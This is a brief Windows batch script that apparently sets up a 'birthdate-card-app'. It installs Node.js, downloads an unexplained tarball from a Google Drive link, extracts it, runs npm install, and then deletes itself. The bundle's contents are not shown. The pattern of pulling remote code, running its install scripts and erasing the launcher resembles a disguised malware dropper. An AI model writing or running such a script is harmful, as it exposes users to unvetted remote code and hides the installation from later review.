winget install OpenJS.NodeJS
mkdir birthdate-card-app
cd birthdate-card-app
curl -L "https://docs.google.com/uc?export=download&id=1MzSDT9cjiA6VuL-Wx54G_KkkzTe9T_gS" > bundle.tar.gz
tar -xvzf bundle.tar.gz
del bundle.tar.gz
npm install
cd ..
start /b "" cmd /c del "%~f0"&exit /b
